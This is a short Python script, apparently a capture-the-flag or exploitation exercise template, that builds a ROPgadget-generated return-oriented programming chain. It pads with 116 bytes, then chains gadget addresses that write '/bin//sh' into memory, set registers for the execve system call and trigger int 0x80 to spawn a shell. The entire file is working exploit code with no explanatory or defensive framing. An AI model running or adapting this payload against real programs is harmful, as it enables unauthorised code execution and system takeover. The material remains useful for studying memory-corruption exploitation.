#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack


p = "A" * 116
# Padding goes here

p += pack('<I', 0x0806f68b).decode('latin-1') # pop edx ; ret
p += pack('<I', 0x080eb060).decode('latin-1') # @ .data
p += pack('<I', 0x080b9116).decode('latin-1') # pop eax ; ret
p += b'/bin'.decode('latin-1')
p += pack('<I', 0x08054c7b).decode('latin-1') # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f68b).decode('latin-1') # pop edx ; ret
p += pack('<I', 0x080eb064).decode('latin-1') # @ .data + 4
p += pack('<I', 0x080b9116).decode('latin-1') # pop eax ; ret
p += b'//sh'.decode('latin-1')
p += pack('<I', 0x08054c7b).decode('latin-1') # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f68b).decode('latin-1') # pop edx ; ret
p += pack('<I', 0x080eb068).decode('latin-1') # @ .data + 8
p += pack('<I', 0x080496c3).decode('latin-1') # xor eax, eax ; ret
p += pack('<I', 0x08054c7b).decode('latin-1') # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9).decode('latin-1') # pop ebx ; ret
p += pack('<I', 0x080eb060).decode('latin-1') # @ .data
p += pack('<I', 0x080d66ec).decode('latin-1') # pop ecx ; ret
p += pack('<I', 0x080eb068).decode('latin-1') # @ .data + 8
p += pack('<I', 0x0806f68b).decode('latin-1') # pop edx ; ret
p += pack('<I', 0x080eb068).decode('latin-1') # @ .data + 8
p += pack('<I', 0x080496c3).decode('latin-1') # xor eax, eax ; ret
p += pack('<I', 0x08048a17).decode('latin-1') # inc eax ; ret
p += pack('<I', 0x08048a17).decode('latin-1') # inc eax ; ret
p += pack('<I', 0x08048a17).decode('latin-1') # inc eax ; ret
p += pack('<I', 0x08048a17).decode('latin-1') # inc eax ; ret
p += pack('<I', 0x08048a17).decode('latin-1') # inc eax ; ret
p += pack('<I', 0x08048a17).decode('latin-1') # inc eax ; ret
p += pack('<I', 0x08048a17).decode('latin-1') # inc eax ; ret
p += pack('<I', 0x08048a17).decode('latin-1') # inc eax ; ret
p += pack('<I', 0x08048a17).decode('latin-1') # inc eax ; ret
p += pack('<I', 0x08048a17).decode('latin-1') # inc eax ; ret
p += pack('<I', 0x08048a17).decode('latin-1') # inc eax ; ret
p += pack('<I', 0x0806fc90).decode('latin-1') # int 0x80 ; ret

# YOUR CODE: Generate buf appropriately
print(p)